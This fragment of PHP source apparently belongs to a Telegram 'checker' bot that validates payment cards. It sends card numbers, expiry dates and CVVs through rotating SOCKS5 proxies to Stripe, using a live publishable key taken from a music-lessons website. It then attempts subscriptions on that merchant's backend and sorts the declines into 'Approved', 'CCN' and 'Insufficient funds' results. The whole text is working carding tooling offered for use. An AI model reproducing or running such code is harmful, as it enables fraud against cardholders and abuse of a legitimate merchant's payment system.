...
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!mbt card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}
...
curl_setopt($ch, CURLOPT_URL, 'https://dashboard.odeum.io/api/2.0/subscriptions/check_new_subscriber.json');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: dashboard.odeum.io';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'accept-language: es-ES,es;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://www.promusiclessons.tv';
$headers[] = 'referer: https://www.promusiclessons.tv/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'x-account-property: Promltvakseiwoaeh208913901273';
...
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","subscription_plan_id":628}');
$curl = curl_exec($ch);
...
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$firstname.'+'.$lastname.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zip.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&payment_user_agent=stripe.js%2F97f7346823%3B+stripe-js-v3%2F97f7346823%3B+card-element&referrer=https%3A%2F%2Fwww.promusiclessons.tv&time_on_page=1980823&key=pk_live_T9751xpvoCPk1TxnbUxaTAoN&pasted_fields=number');
$curl = curl_exec($ch);
$token_id = trim(getStr($curl, '"id": "', '"'));

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://dashboard.odeum.io/api/2.0/subscriptions/subscribe_through_web.json');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: dashboard.odeum.io';
$headers[] = 'accept: application/json, text/plain, */*';
...
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"subscription_plan_id":628,"has_coupon":false,"coupon_code":"","email":"'.$email.'","name":"'.$firstname.' '.$lastname.'","cc_valid":true,"allow_coupon":true,"subscription_eligible":true,"stripe_source_token":"'.$token_id.'","planData":{"id":628,"account_id":1351,"stripe_id":"Production-1351-628","apple_product_id":"promusic_monthly","roku_product_id":"promusic_monthly","google_product_id":"promusic_monthly","name":"Monthly ProMusic","statement_descriptor":"ProMusicLessons.tv","interval":"month","interval_count":1,"amount":499,"display_price":"$4.99/Mo","trial_period_days":7,"status":"Live","order":0,"created":"2023-02-16 09:15:45","modified":"2023-04-01 17:14:34","discount":null,"months_in_plan":1,"yearly_normalized_amount":499,"label":"$4.99/Mo (7 Day Free Trial)"}}');
$result2 = curl_exec($ch);
$message = trim(getStr($result2, '"message":"', '"'));
...
$status = "Approved ✅";
$response = "[Approved! 🟩 ]";
}elseif($message == "Your card's security code is incorrect."){
$status = "CARD CCN! ✅";
$response = "Your card's security code is incorrect.";
}elseif ($message == "Insufficient funds"){ 
$status = "Approved!🟩";
$response = "Insufficient funds 🟩";
}elseif ($message == "3D secure failed"){ 
